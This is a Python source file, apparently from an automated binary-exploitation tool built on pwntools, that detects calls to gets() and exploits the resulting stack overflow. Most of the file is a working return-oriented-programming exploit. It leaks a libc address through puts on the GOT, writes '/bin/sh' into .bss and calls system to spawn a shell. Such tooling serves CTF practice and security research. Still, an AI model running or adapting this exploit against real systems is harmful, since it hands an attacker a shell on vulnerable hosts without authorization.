import smrop
import logging

import pwn

logger = logging.getLogger('ashnazg')

ANALYSES = []
def register(clazz):
    # TODO: probably don't want to instantiate
    # here, makes more sense to instantiate
    # when the program context is available.
    ANALYSES.append(clazz)

class Vulnerability:
    def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
        raise NotImplementedError()

    def detect(self, function, program):
        raise NotImplementedError()
    
    def exploit(self, function):
        raise NotImplementedError()

@register
class GetsVulnerability(Vulnerability):

    def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
        self.function = function
        self.binary = binary
        self.libc = libc

    def detect(self, function, program):
        # TODO: I *think* this is where we actually
        # instantiate the exploit. Maybe detect
        # is a static method?
        for call in function["calls"]:
            if call["funcName"] == "gets":
                return True
        return False

    def entry(self):
        return int(self.function["address"], 16)

    def exploit(self, conn):
        conn = conn.conn
        function_addr = int(self.function["address"], 16) 
        getscall = None
        for call in self.function["calls"]:
            if call["funcName"] == "gets":
                getscall = call
                break
        # assume stack for now
        # need to add check to validate
        # that the argument is on the stack.
        # otherwise, this is not exploitable
        # via this technique
        # TODO: Add check
        arg = getscall["arguments"][0]
        arg = [v for v in self.function["variables"] if v["name"] == arg][0]
        stackoffset = arg["stackOffset"]
        
        prefix = b"A"*abs(stackoffset)

        # leak libc location
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.got["gets"])
        # TODO: make puts a dependency
        # TODO: abstract out puts to any print
        sm.ret("puts", 'binary')
        sm.ret(function_addr, "binary")
        payload1 = sm.resolve(binary=0x0, libc=0x0)

        # clear out any pending stdout
        conn.recv()

        # read libc location
        logger.info("Sending first payload")
        conn.sendline(payload1)
        gets_location = conn.recvline()[:-1]
        logger.info(gets_location)
        gets_location = int.from_bytes(gets_location, byteorder='little')
        libcoffset = gets_location - self.libc.symbols["gets"]
        logger.info("Libc found at {}".format(hex(libcoffset)))

        # clear out any pending stdout
        conn.recv(timeout=1)

        # send /bin/sh
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.bss()+0x100)
        sm.ret("gets", "binary")
        sm.ret(function_addr, "binary")
        payload2 = sm.resolve(binary=0x0)
        
        logger.info("sending second payload")
        conn.sendline(payload2)
        conn.sendline("/bin/sh\x00")

        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.bss()+0x100)
        sm.nop()
        sm.ret("system", "libc")

        payload3 = sm.resolve(binary=0x0, libc=libcoffset)

        logger.info("Sending final payload")
        conn.sendline(payload3)
